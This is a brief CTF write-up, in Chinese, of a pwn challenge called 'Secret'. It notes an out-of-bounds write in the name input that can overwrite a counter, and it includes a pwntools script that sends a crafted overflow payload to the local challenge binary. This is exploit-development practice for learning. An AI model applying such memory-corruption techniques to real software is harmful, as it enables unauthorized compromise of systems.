# Secret





![sn2I8r](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/sn2I8r.png)

一个密码机，要连续输入100次secrest才能get flag。。。显然是唬人的

![adfasfdasfasf](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/adfasfdasfasf.png)

![9b0ViT](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/9b0ViT.png)


![image-20200321174114753](/Users/migraine/Library/Application Support/typora-user-images/image-20200321174114753.png)

输入name的时候，有个越界，可以把记数用的内存覆盖掉。。。不过这个漏洞似乎并没有什么用？

![image-20200321172737950](/Users/migraine/Library/Application Support/typora-user-images/image-20200321172737950.png)

```python
#!/usr/bin/python
from pwn import *
p=process("./secret.dms")
gdb.attach(p,"b *0x46a396")

p.sendline(p64(0x0)+"\x00"*0x8+p32(0x46d080))

p.recvuntil('Secret:')
#p.sendline(str(18283))

p.interactive()

'''
>>> print 0x476b
18283

'''
```

